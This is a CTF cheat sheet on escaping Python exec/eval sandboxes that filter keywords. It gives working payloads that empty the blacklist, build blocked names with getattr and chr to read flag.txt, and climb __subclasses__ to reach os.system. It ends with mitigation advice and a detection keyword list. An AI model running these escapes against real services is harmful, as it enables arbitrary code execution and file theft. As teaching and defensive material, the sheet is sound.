---
title: "PyJail: blacklists and escapes"
tags: [misc, pyjail, python, sandbox, exec, ctf]
---

# PyJail: blacklists and escapes

**English** | [🇪🇸 Español](pyjail-bypass.md)

## 1. When to look here

A Python service runs user input through `exec`/`eval` and filters words. The goal is to read a file or call a function whose name the filter blocks. The classic pattern:

```python
if any(b in command for b in blacklist):
    continue
exec(command)
```

Before improvising, identify **what** is filtered: strings, characters, length, access to `__builtins__`. Also check whether the process dies on the first exception, since that rules out boolean extraction.

## 2. Empty the filter

The blacklist is usually a global variable reachable from `exec`. If methods are not filtered, it can be emptied without brackets or quotes:

```python
blacklist.clear()
open_chest()
```

Variants: `blacklist.__init__()`, repeated `blacklist.pop()`, or reassigning via `globals().update(...)`. If `clear` is blocked, build the name in pieces.

## 3. Build forbidden names

`getattr` plus concatenation avoids the literal substring:

```python
getattr(__builtins__, "op" + "en")("flag.txt").read()
```

`chr` builds strings with no quotes and no forbidden letters:

```python
print(open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())
```

If `print` is blocked, use `sys.stdout.write` or the return value of `exec` with `compile`.

## 4. Reach the builtins

When the environment does not expose `__builtins__` directly, climb object attributes:

```python
().__class__.__base__.__subclasses__()
```

From there, find a class that imports modules (`warnings.catch_warnings`, `os._wrap_close`) and reach `os`:

```python
builtins = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__
imp = builtins.get("__import__")
imp("os").system("id")
```

Indexes change between Python versions: list them locally before pinning one.

## 5. When the filter targets characters

- No quotes: `chr()`, `bytes([...]).decode()`.
- No brackets: `().__class__`, `dict()`, `list()`.
- No underscores: `getattr(obj, "_"*2 + "class" + "_"*2)`.
- No dots: chained `getattr`.
- No `import`: `__import__`, `importlib`, or a class that already imported the module.

## 6. Real limits of the sandbox

`exec` in the same process **is not a sandbox**: the attacker shares `globals()`, can modify the filter and reach the filesystem. Real isolation requires:

- a separate unprivileged process with `seccomp` and no sensitive files;
- a read-only container with no network;
- allowlists of operations, not string blacklists.

## 7. Typical errors

- **One exception kills the service**: always test locally and check the syntax.
- **Different subclass index**: depends on the version and imported modules.
- **Substring filter**: `open` blocks `open_chest` but also `reopen`; building the name dodges both.
- **`print` blocked**: use `sys.stdout.write` or return the value.
- **Quotes filtered**: `chr()` is the short path, but some filters block `chr`; then `bytes([...])`.

## 8. Detection and mitigation (real world)

- Never execute user input: no blacklist is reliable.
- If evaluation is needed, use an expression interpreter with an allowlist (for example `ast.literal_eval` for data) and an isolated process.
- Detection: commands containing `clear()`, `__builtins__`, `__subclasses__`, `getattr`, `chr(` or concatenated names; bursts of exceptions followed by a disconnect.

MITRE: T1059 (command execution), T1027 (obfuscation). References: `exec` documentation, `ast.literal_eval`, and PyJail escape guides.
